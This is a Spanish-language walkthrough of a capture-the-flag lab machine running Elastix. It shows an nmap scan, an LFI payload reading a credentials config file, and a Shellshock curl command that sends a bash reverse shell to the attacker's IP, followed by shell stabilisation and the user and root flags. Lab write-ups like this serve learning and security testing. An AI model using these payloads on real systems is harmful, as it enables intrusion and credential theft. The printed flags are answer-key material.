
![[ 20250719142538.png]](beep-images/20250719142538.png)

# NMAP

primero realizamos un escaneo de nmap. pero en este caso a diferencia de mis otros writeups vamos a cambiar el método

normalmente realizamos un primer escaneo básico para encontrar los puertos abiertos y después lanzamos un escaneo son scripts básicos de nmap para encontrar servicios y versiones. Esto lo hacemos para que el escaneo básico sea rápido y posteriormente conseguimos un archivo al que llamamos targeted donde tenemos la informacion bien agrupada y fácil de leer.

En este caso debido a que la cantidad de puertos es enorme vamos a realizar ambos escaneos a la vez, es cierto que tardara mas en darnos el resultado pero con esto ganamos el esperar tan solo una vez y no tener que estar en dos escaneos esperando demasiado tiempo. de todas formas podeis realizar el escaneo como vosotros queráis no es estrictamente necesario imitar esta técnica.

```bash
nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn 10.129.183.206 -sC -sV -oN targeted
```

![[ 20250719135701.png]](beep-images/20250719135701.png)
![[ 20250719135718.png]](beep-images/20250719135718.png)

# Puerto 80

>(Al principio puede dar fallo la pagina web, recomendación: poner en la URL "about:config" y en la barrita de búsqueda "security.tls.version.min" )

![[ 20250719142158.png]](beep-images/20250719142158.png)

>con estos cambios no debería haber problema

como siempre que una maquina tiene un puerto 80 con http / https abiertos empezamos por aqui 

![[ 20250719135953.png]](beep-images/20250719135953.png)

vemos esta pagina web de elastix

buscando un poco en exploitDB y varias paginas de google conseguimos encontrar esta vulnerabilidad "Elastix 2.2.0 - 'graph.php' Local File Inclusion" 

es un LFI que segun exploitDB el vector de ataque seria:

```pl
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

probamos a inyectar esto en la pagina web 


![[ 20250719140246.png]](beep-images/20250719140246.png)

![[ 20250719140400.png]](beep-images/20250719140400.png)

podemos ver líneas interesantes con usuarios y contraseñas


en el puerto 80 si que conseguimos acceso pero no nos sirve de mucho pero en el puerto 10000 no conseguimos acceso aunque si que vemos por URL lo siguiente

https://10.129.183.206:10000/session_login.cgi

un .cgi por el que podriamos tratar de realizar un ataque shellsock 

# Shellshock

en nuestra maquina atacante abrimos un puerto de escucha con nc

```bash
nc -nlvp 4444
```

![[ 20250719141259.png]](beep-images/20250719141259.png)

y mientras estamos en escucha lanzamos el ataque shellshock 

```bash
curl --tlsv1.0 --tls-max 1.0 -k -A "() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.48/4444 0>&1" https://10.129.183.206:10000/session_login.cgi &>/dev/null
```



tenemos shell como root 

![[ 20250719141324.png]](beep-images/20250719141324.png)

# Tratamiento de Shell

como siempre vamos a tratar la shell para trabajar comodos

```bash
which python
```

vemos que python existe ya que esta en el directorio /usr/bin/pyton

asi que utilizamos el comando

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

despues suspendemos la shell con Ctrl +Z 

utilizamos 
```bash
stty raw -echo; fg
```

y ponemos 
```bash
export TERM=xterm
```

# Flags

una vez tenemos la shell practica vamos a por las flags

## user

![[ 20250719141718.png]](beep-images/20250719141718.png)

user :  f39e9e4509649148e06e50b0e2a1a5cd

## root

![[ 20250719141808.png]](beep-images/20250719141808.png)

root : 06673369bab439c578238b14b27fbc96

